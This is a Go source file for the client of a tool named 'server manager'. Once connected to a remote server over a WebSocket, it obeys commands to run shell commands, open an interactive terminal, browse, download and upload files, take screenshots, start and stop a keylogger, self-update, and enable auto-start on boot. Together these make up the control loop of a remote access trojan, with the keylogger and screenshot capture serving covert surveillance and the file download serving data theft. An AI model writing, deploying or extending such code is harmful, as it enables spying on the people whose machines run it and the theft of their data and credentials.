package client

import (
	"crypto/tls"
	"flag"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"time"

	"mww2.com/server_manager/common"

	"github.com/gorilla/websocket"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/mem"
)

const (
	ClientVersion = "1.0.0"
)

// Client represents the client application
type Client struct {
	config        *Config
	conn          *websocket.Conn
	authenticated bool
	running       bool

	// Component handlers
	commandExec *CommandExecutor
	fileBrowser *FileBrowser
	screenshot  *ScreenshotCapture
	keylogger   *Keylogger
	updater     *Updater
	autoStart   *AutoStart
	terminalMgr *TerminalManager

	// Channels
	sendChan chan *common.Message
	stopChan chan bool
}

// Config holds client configuration
type Config struct {
	ServerURL string
	ClientID  string
	AuthToken string
	AutoStart bool
}

// NewClient creates a new client instance
func NewClient(config *Config) *Client {
	terminalMgr := NewTerminalManager()

	client := &Client{
		config:      config,
		commandExec: NewCommandExecutor(),
		fileBrowser: NewFileBrowser(),
		screenshot:  NewScreenshotCapture(),
		keylogger:   NewKeylogger(),
		updater:     NewUpdater(ClientVersion),
		autoStart:   NewAutoStart("ServerManagerClient"),
		terminalMgr: terminalMgr,
		sendChan:    make(chan *common.Message, 256),
		stopChan:    make(chan bool),
	}

	// Set terminal output callbacks
	terminalMgr.SetOutputCallback(func(sessionID, data string) {
		payload := &common.TerminalOutputPayload{
			SessionID: sessionID,
			Data:      data,
		}
		client.sendMessage(common.MsgTypeTerminalOutput, payload)
	})

	terminalMgr.SetErrorCallback(func(sessionID, data string) {
		payload := &common.TerminalOutputPayload{
			SessionID: sessionID,
			Data:      data,
			Error:     "stderr",
		}
		client.sendMessage(common.MsgTypeTerminalOutput, payload)
	})

	return client
}

// Start starts the client
func (c *Client) Start() error {
	log.Printf("Starting client version %s", ClientVersion)
	log.Printf("Client ID: %s", c.config.ClientID)
	log.Printf("Server URL: %s", c.config.ServerURL)

	// Setup auto-start if configured
	if c.config.AutoStart {
		if err := c.autoStart.Enable(); err != nil {
			log.Printf("Warning: Failed to enable auto-start: %v", err)
		} else {
			log.Printf("Auto-start enabled")
		}
	}

	// Connect to server
	if err := c.connect(); err != nil {
		return err
	}

	c.running = true

	// Start message handler goroutines
	go c.readPump()
	go c.writePump()
	go c.heartbeatLoop()

	log.Printf("Client started successfully")
	return nil
}

// Stop stops the client
func (c *Client) Stop() {
	log.Printf("Stopping client...")
	c.running = false
	close(c.stopChan)

	if c.keylogger.IsRunning() {
		c.keylogger.Stop()
	}

	if c.conn != nil {
		c.conn.Close()
	}

	log.Printf("Client stopped")
}

// connect establishes connection to the server
func (c *Client) connect() error {
	log.Printf("Connecting to server: %s", c.config.ServerURL)

	// Setup TLS config - always verify certificates for HTTPS
	tlsConfig := &tls.Config{
		InsecureSkipVerify: false, // Always verify certificates
		MinVersion:         tls.VersionTLS12,
	}

	dialer := websocket.Dialer{
		TLSClientConfig:  tlsConfig,
		HandshakeTimeout: 10 * time.Second,
	}

	// Connect to WebSocket
	conn, _, err := dialer.Dial(c.config.ServerURL, http.Header{})
	if err != nil {
		return err
	}

	c.conn = conn
	log.Printf("WebSocket connection established (TLS verified)")

	// Authenticate
	if err := c.authenticate(); err != nil {
		c.conn.Close()
		return err
	}

	log.Printf("Authentication successful")
	return nil
}

// getLocalIP gets the local IP address
func (c *Client) getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// authenticate performs authentication with the server
func (c *Client) authenticate() error {
	hostname, _ := os.Hostname()
	localIP := c.getLocalIP()

	authPayload := &common.AuthPayload{
		ClientID: c.config.ClientID,
		Token:    c.config.ClientID, // Use machine ID as token
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Hostname: hostname,
		IP:       localIP,
	}

	authMsg, err := common.NewMessage(common.MsgTypeAuth, authPayload)
	if err != nil {
		return err
	}

	// Send authentication message
	if err := c.conn.WriteJSON(authMsg); err != nil {
		return err
	}

	// Wait for response
	var respMsg common.Message
	if err := c.conn.ReadJSON(&respMsg); err != nil {
		return err
	}

	if respMsg.Type != common.MsgTypeAuthResponse {
		return ErrInvalidResponse
	}

	var authResp common.AuthResponsePayload
	if err := respMsg.ParsePayload(&authResp); err != nil {
		return err
	}

	if !authResp.Success {
		return ErrAuthFailed
	}

	c.authenticated = true
	return nil
}

// readPump reads messages from the server
func (c *Client) readPump() {
	defer func() {
		c.Stop()
	}()

	c.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	c.conn.SetPongHandler(func(string) error {
		c.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	for c.running {
		var msg common.Message
		err := c.conn.ReadJSON(&msg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		// Handle message
		go c.handleMessage(&msg)
	}
}

// writePump writes messages to the server
func (c *Client) writePump() {
	ticker := time.NewTicker(54 * time.Second)
	defer func() {
		ticker.Stop()
		c.conn.Close()
	}()

	for {
		select {
		case message, ok := <-c.sendChan:
			c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				c.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			if err := c.conn.WriteJSON(message); err != nil {
				log.Printf("Write error: %v", err)
				return
			}

		case <-ticker.C:
			c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := c.conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}

		case <-c.stopChan:
			return
		}
	}
}

// handleMessage handles incoming messages from the server
func (c *Client) handleMessage(msg *common.Message) {
	log.Printf("Received message: %s", msg.Type)

	switch msg.Type {
	case common.MsgTypeExecuteCommand:
		c.handleExecuteCommand(msg)

	case common.MsgTypeBrowseFiles:
		c.handleBrowseFiles(msg)

	case common.MsgTypeDownloadFile:
		c.handleDownloadFile(msg)

	case common.MsgTypeUploadFile:
		c.handleUploadFile(msg)

	case common.MsgTypeTakeScreenshot:
		c.handleTakeScreenshot(msg)

	case common.MsgTypeStartKeylogger:
		c.handleStartKeylogger(msg)

	case common.MsgTypeStopKeylogger:
		c.handleStopKeylogger(msg)

	case common.MsgTypeUpdate:
		c.handleUpdate(msg)

	case common.MsgTypeStartTerminal:
		c.handleStartTerminal(msg)

	case common.MsgTypeTerminalInput:
		c.handleTerminalInput(msg)

	case common.MsgTypeStopTerminal:
		c.handleStopTerminal(msg)

	case common.MsgTypePing:
		c.sendMessage(common.MsgTypePong, nil)

	default:
		log.Printf("Unknown message type: %s", msg.Type)
	}
}

// handleExecuteCommand handles command execution requests
func (c *Client) handleExecuteCommand(msg *common.Message) {
	var payload common.ExecuteCommandPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse command payload: %v", err)
		return
	}

	log.Printf("Executing command: %s %v", payload.Command, payload.Args)
	result := c.commandExec.Execute(&payload)

	c.sendMessage(common.MsgTypeCommandResult, result)
}

// handleBrowseFiles handles file browsing requests
func (c *Client) handleBrowseFiles(msg *common.Message) {
	var payload common.BrowseFilesPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse browse payload: %v", err)
		return
	}

	log.Printf("Browsing files: %s", payload.Path)
	result := c.fileBrowser.Browse(&payload)

	c.sendMessage(common.MsgTypeFileList, result)
}

// handleDownloadFile handles file download requests
func (c *Client) handleDownloadFile(msg *common.Message) {
	var payload struct {
		Path string `json:"path"`
	}
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse download payload: %v", err)
		return
	}

	log.Printf("Downloading file: %s", payload.Path)
	result := c.fileBrowser.ReadFile(payload.Path)

	c.sendMessage(common.MsgTypeFileData, result)
}

// handleUploadFile handles file upload requests
func (c *Client) handleUploadFile(msg *common.Message) {
	var payload common.FileDataPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse upload payload: %v", err)
		return
	}

	log.Printf("Uploading file: %s", payload.Path)
	err := c.fileBrowser.WriteFile(&payload)

	response := map[string]interface{}{
		"success": err == nil,
		"path":    payload.Path,
	}
	if err != nil {
		response["error"] = err.Error()
	}

	c.sendMessage(common.MsgTypeFileData, response)
}

// handleTakeScreenshot handles screenshot requests
func (c *Client) handleTakeScreenshot(msg *common.Message) {
	var payload common.ScreenshotPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse screenshot payload: %v", err)
		// Use default payload
	}

	log.Printf("Taking screenshot")
	result := c.screenshot.Capture(&payload)

	c.sendMessage(common.MsgTypeScreenshotData, result)
}

// handleStartKeylogger handles keylogger start requests
func (c *Client) handleStartKeylogger(msg *common.Message) {
	var payload common.KeyloggerPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse keylogger payload: %v", err)
		return
	}

	log.Printf("Starting keylogger: target=%s", payload.Target)
	err := c.keylogger.Start(&payload)

	status := &common.UpdateStatusPayload{
		Status: "started",
	}
	if err != nil {
		status.Status = "failed"
		status.Error = err.Error()
	}

	c.sendMessage(common.MsgTypeUpdateStatus, status)
}

// handleStopKeylogger handles keylogger stop requests
func (c *Client) handleStopKeylogger(msg *common.Message) {
	log.Printf("Stopping keylogger")
	err := c.keylogger.Stop()

	status := &common.UpdateStatusPayload{
		Status: "stopped",
	}
	if err != nil {
		status.Status = "failed"
		status.Error = err.Error()
	}

	c.sendMessage(common.MsgTypeUpdateStatus, status)
}

// handleUpdate handles update requests
func (c *Client) handleUpdate(msg *common.Message) {
	var payload common.UpdatePayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse update payload: %v", err)
		return
	}

	log.Printf("Updating to version %s", payload.Version)
	result := c.updater.Update(&payload)

	c.sendMessage(common.MsgTypeUpdateStatus, result)

	// If update successful, restart
	if result.Status == "complete" {
		time.Sleep(2 * time.Second)
		c.updater.RestartClient()
	}
}

// handleStartTerminal handles terminal start requests
func (c *Client) handleStartTerminal(msg *common.Message) {
	var payload common.StartTerminalPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse start terminal payload: %v", err)
		return
	}

	log.Printf("Starting terminal session: %s", payload.SessionID)
	err := HandleStartTerminal(c.terminalMgr, &payload)

	if err != nil {
		errorPayload := &common.TerminalOutputPayload{
			SessionID: payload.SessionID,
			Data:      "",
			Error:     err.Error(),
		}
		c.sendMessage(common.MsgTypeTerminalOutput, errorPayload)
	}
}

// handleTerminalInput handles terminal input
func (c *Client) handleTerminalInput(msg *common.Message) {
	var payload common.TerminalInputPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse terminal input payload: %v", err)
		return
	}

	err := HandleTerminalInput(c.terminalMgr, &payload)
	if err != nil {
		log.Printf("Terminal input error: %v", err)
	}
}

// handleStopTerminal handles terminal stop requests
func (c *Client) handleStopTerminal(msg *common.Message) {
	var payload common.TerminalInputPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse stop terminal payload: %v", err)
		return
	}

	log.Printf("Stopping terminal session: %s", payload.SessionID)
	err := HandleStopTerminal(c.terminalMgr, payload.SessionID)
	if err != nil {
		log.Printf("Failed to stop terminal: %v", err)
	}
}

// sendMessage sends a message to the server
func (c *Client) sendMessage(msgType common.MessageType, payload interface{}) {
	msg, err := common.NewMessage(msgType, payload)
	if err != nil {
		log.Printf("Failed to create message: %v", err)
		return
	}

	select {
	case c.sendChan <- msg:
	case <-time.After(5 * time.Second):
		log.Printf("Failed to send message: timeout")
	}
}

// heartbeatLoop sends periodic heartbeat messages
func (c *Client) heartbeatLoop() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			c.sendHeartbeat()
		case <-c.stopChan:
			return
		}
	}
}

// sendHeartbeat sends a heartbeat message with system stats
func (c *Client) sendHeartbeat() {
	cpuPercent, _ := cpu.Percent(time.Second, false)
	memStats, _ := mem.VirtualMemory()
	diskStats, _ := disk.Usage("/")

	var cpuUsage, memUsage, diskUsage float64
	if len(cpuPercent) > 0 {
		cpuUsage = cpuPercent[0]
	}
	if memStats != nil {
		memUsage = memStats.UsedPercent
	}
	if diskStats != nil {
		diskUsage = diskStats.UsedPercent
	}

	payload := &common.HeartbeatPayload{
		ClientID:   c.config.ClientID,
		Status:     "online",
		CPUUsage:   cpuUsage,
		MemUsage:   memUsage,
		DiskUsage:  diskUsage,
		Uptime:     0, // Could track actual uptime
		LastActive: time.Now(),
	}

	c.sendMessage(common.MsgTypeHeartbeat, payload)
}

// Main is the main entry point for the client
func Main() {
	// Parse command line flags
	serverURL := flag.String("server", "wss://localhost/ws", "Server WebSocket URL (use wss:// for HTTPS)")
	autoStart := flag.Bool("autostart", false, "Enable auto-start on boot")
	flag.Parse()

	// Generate machine ID automatically
	idGen := NewMachineIDGenerator()
	machineID, err := idGen.GetMachineID()
	if err != nil {
		log.Fatalf("Failed to generate machine ID: %v", err)
	}

	log.Printf("Machine ID: %s", machineID)
	log.Printf("Authentication: Using machine ID (no token required)")

	config := &Config{
		ServerURL: *serverURL,
		ClientID:  machineID,
		AuthToken: machineID, // Use machine ID as authentication
		AutoStart: *autoStart,
	}

	// Create and start client
	client := NewClient(config)
	if err := client.Start(); err != nil {
		log.Fatalf("Failed to start client: %v", err)
	}

	// Wait for termination signal
	select {}
}
